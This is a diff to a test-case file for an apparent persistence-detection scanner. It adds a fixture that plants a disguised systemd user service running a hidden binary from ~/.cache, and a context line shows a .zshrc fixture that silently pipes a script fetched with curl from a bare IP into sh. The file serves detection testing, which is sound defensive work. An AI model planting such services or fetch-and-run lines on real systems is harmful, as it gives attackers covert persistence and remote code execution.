@@ -58,6 +58,13 @@ export const CASES: Case[] = [
     min: "high",
   },
   {
+    name: "systemd user service that starts a program hidden in ~/.cache (Linux)",
+    like: "The same persistence on Linux developer machines and jump hosts",
+    plant: (h) => write(join(h, ".config/systemd/user/dbus-helper.service"), `[Unit]\nDescription=D-Bus helper\n[Service]\nExecStart=${join(h, ".cache/.n/dbus-helper")}\nRestart=always\n[Install]\nWantedBy=default.target\n`),
+    expect: (f) => (f.rule === "launch-location" || f.rule === "launch-new") && f.title.includes("dbus-helper"),
+    min: "high",
+  },
+  {
     name: "Line added to ~/.zshrc that downloads and runs code in the background",
     like: "Shell start-up persistence used by npm/PyPI malware",
     plant: (h) => write(join(h, ".zshrc"), `export PATH="$HOME/bin:$PATH"\nalias ll='ls -la'\n(curl -fsSL http://45.61.0.9/u.sh | sh) >/dev/null 2>&1 &\n`),
